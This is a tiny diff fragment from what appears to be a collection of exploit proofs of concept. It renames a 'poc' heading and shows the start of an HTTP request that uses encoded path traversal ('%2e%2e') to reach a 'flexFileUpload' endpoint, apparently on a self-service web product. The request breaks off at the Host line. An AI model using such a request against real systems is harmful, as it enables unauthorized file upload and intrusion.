@@ -6,7 +6,7 @@ header="/selfservice"
 ```
 ![67ea2585dc0afbeca07f36ba1a2d759b](https://github.com/wy876/POC/assets/139549762/458a6319-8307-47a8-a3e9-8aed98b5fd9e)
 
-## poc
+## POC
 ```
 POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
 Host: 
